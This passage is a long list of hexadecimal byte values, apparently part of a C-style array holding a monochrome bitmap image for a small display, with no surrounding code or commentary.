0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,
0X3F,0X3F,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0X3E,0X7F,0XFF,0XFF,0XFF,0X80,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,
0XFF,0XFF,0X7C,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFE,0X79,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,
0X3F,0XFF,0XFF,0XFE,0X63,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFE,0XCF,0XFF,0XFF,
0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X00,0X1F,0XFF,0XFF,0XFC,0X8F,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFD,0X1F,
0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFC,0X7F,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,
0XF8,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XF9,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,
0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X07,
0XFF,0XFF,0XF3,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X07,0XFF,0XFF,0XF7,0XFF,0XFF,0XFF,0XFF,
0XF8,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0XFC,0XFF,0XFF,
0XFF,0XFF,0XFF,0X8F,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X78,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,0X07,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X38,
0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X18,0X7F,0XFF,0XFF,0XFF,0XFF,0X86,0X00,
0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,
0X00,0X0C,0XFF,0XFF,0XFF,0XFF,0XFF,0XCC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X3F,
0XFF,0XE1,0XFF,0XFF,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X0F,0XFF,0XE1,0XFF,0XFC,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,
0X00,0X03,0XFF,0XE1,0XFF,0XF0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X7F,0XE1,0XFF,0X80,0X00,
0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFC,0X00,0X00,0X0F,0XFF,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFC,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X1E,0X00,
0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,
0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X18,0X1F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X00,0X01,0XEF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,
0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0X00,0X1F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X0C,0X30,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X80,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X81,0XFC,
0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X03,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X1C,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,
0X00,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,0X0F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X01,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFF,0XFF,0XFF,0X80,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,
0X00,0X7F,0XFF,0XE0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0X00,0X00,
0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,
0X00,0X00,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,
0X00,0X00,0X00,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0XFF,0X80,0X00,0X07,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X00,0X1F,0XFF,0XF0,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X3F,0XFF,0XFF,0XFC,
0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XC0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,
0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X03,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XF8,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,
0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,
0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0XC1,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X0E,0X0F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X06,0X00,0X67,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0X00,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X08,0X6F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X0C,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X3F,0X80,0XC7,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0XFF,0XF2,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X01,0XFF,0XFF,
0X9F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X47,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFB,0XFF,0XFF,0XFF,0XFF,0XE0,0X8F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE3,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X87,0XFF,0XFF,0XFF,0XF8,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X07,0XFF,0XFF,
0XFF,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X07,0XFF,0XFF,0XFC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X0F,
0XFF,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X0F,0XFF,0XFF,0XC0,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFC,
0X00,0X0F,0XFF,0XFE,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X0F,0XFF,0XFF,0XFF,0XF0,0X00,0X0F,0XFF,0XF8,0X00,0X03,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X1F,0XFF,0XFF,
0XFF,0XC0,0X00,0X1F,0XFF,0XC0,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X1F,0XFF,0XFF,0XFF,0X00,0X00,0X1F,0XFF,0X00,0X00,
0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X1F,
0XFF,0XFF,0XFC,0X00,0X00,0X1F,0XF8,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X1F,0XFF,0XFF,0XF8,0X00,0X00,0X1F,0XF0,
0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XE0,0X00,0X00,0X1F,0X80,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1F,0XFF,0XFF,0X80,0X00,0X00,
0X3C,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XF8,0X00,0X1F,0XFF,0XFE,0X00,0X00,0X00,0X30,0X00,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X3F,0XFF,0XF8,0X00,
0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X80,0X00,0X3F,0XFF,0XE0,0X00,0X03,0X00,0X00,0X00,0X01,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X3F,0XFF,
0XC0,0X00,0X06,0X00,0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X3F,0XFF,0X00,0X00,0X0E,0X00,0X00,0X00,0X07,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,
0X3F,0XFC,0X00,0X00,0X1E,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X3F,0XF0,0X00,0X00,0X7E,0X00,0X00,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X00,0X3F,0XC0,0X00,0X00,0XFC,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X7F,0X00,0X00,0X03,0XFC,
0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X00,0X00,0X7C,0X00,0X00,0X07,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,0X78,0X00,0X00,
0X0F,0XFC,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X00,0X00,0X00,0X60,0X00,0X00,0X1F,0XFC,0X00,0X00,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,
0X00,0X00,0X7F,0XF8,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0X00,0X00,0X00,0X00,0XFF,0XF8,0X00,0X03,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X06,
0X00,0X00,0X00,0X03,0XFF,0XF8,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X0E,0X00,0X00,0X00,0X07,0XFF,0XF0,0X00,
0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,
0X00,0X1E,0X00,0X00,0X00,0X0F,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X1E,0X00,0X00,0X00,0X1F,0XFF,
0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X00,0X00,0X3E,0X00,0X00,0X00,0X7F,0XFF,0XF0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0XFE,0X00,0X00,0X00,
0XFF,0XFF,0XF0,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X00,0X01,0XFC,0X00,0X00,0X03,0XFF,0XFF,0XE0,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0XFC,0X00,
